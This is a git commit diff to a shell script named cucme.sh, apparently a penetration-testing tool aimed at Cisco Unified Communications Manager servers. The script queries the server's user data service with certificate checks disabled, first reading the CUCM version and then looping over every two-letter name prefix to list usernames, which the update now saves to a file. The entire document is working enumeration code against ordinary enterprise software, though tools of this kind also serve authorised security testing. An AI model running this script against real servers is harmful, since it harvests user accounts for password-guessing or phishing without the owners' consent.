34cb04385af3c48c73fee9ee153d47e10b9cd5af
n00py <n00py@protonmail.com>
2022-01-29 00:25:43 -0700

    Update cucme.sh

--- cucme.sh
+++ cucme.sh
@@ -1,11 +1,14 @@
 if [ $# -eq 0 ]
   then
-    echo "Please provide a hostname or IP address"
+    echo "Please provide a hostname or IP Address"
     exit 1
 fi
+echo -n "Detected CUCM Version: " 
+curl "https://$1:8443/cucm-uds/version" -k -s | xml_grep version --text_only 
 echo 'Please wait just a moment...'
 for x in {a..z}
 	do for y in {a..z}
 		do curl "https://$1:8443/cucm-uds/users?name=$x$y" -k -s | xml_grep userName --text_only 
 	done 
-done | sort -u
+done | sort -u > cucm_users.txt
+echo "User dump complete!"
